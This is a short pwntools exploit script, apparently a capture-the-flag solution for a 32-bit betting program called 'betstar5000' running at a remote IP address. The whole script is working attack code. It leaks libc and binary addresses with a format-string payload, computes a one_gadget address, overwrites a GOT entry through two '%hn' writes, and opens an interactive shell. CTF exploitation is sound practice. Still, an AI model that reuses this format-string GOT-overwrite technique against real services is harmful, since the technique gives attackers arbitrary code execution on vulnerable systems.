from pwn import *

io=remote('13.53.69.114',50000)
#io=process('betstar5000')
libc=ELF('libc-2.27.so')
context.terminal = ['gnome-terminal','-x','sh','-c']

def bet(player,nu):
    io.sendline('1')
    io.sendline(str(player))
    io.sendline(str(nu))

def edit(idx,name):
    io.sendline('4')
    io.sendline(str(idx))
    io.sendline(name)

io.sendline('1')
io.sendline('%2$p%39$p')


bet(1,1)
io.recvuntil('*drumroll*: ')
libc_base=int(io.recv(10)[2:],16)-libc.sym['_IO_2_1_stdin_']
print(hex(libc.sym['_IO_2_1_stdin_']))
text_base=int(io.recv(10)[2:],16)-0x0CCB
cmp_got=text_base+0x00254C
one_gadget=libc_base+0x03d200
a=one_gadget&0xffff
b=(one_gadget>>16)&0xffff
print(hex(cmp_got))
print(hex(libc_base),hex(text_base),hex(one_gadget))
print(hex(a),hex(b))

def debug(addr):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

#debug(hex(libc_base+0x0000E8E))

edit(0,p32(cmp_got)+'%'+str(a-4)+'c%19$hn')
bet(1,1)
edit(0,p32(cmp_got+2)+'%'+str(b-4)+'c%19$hn')
bet(1,1)

io.sendline('5')


io.interactive()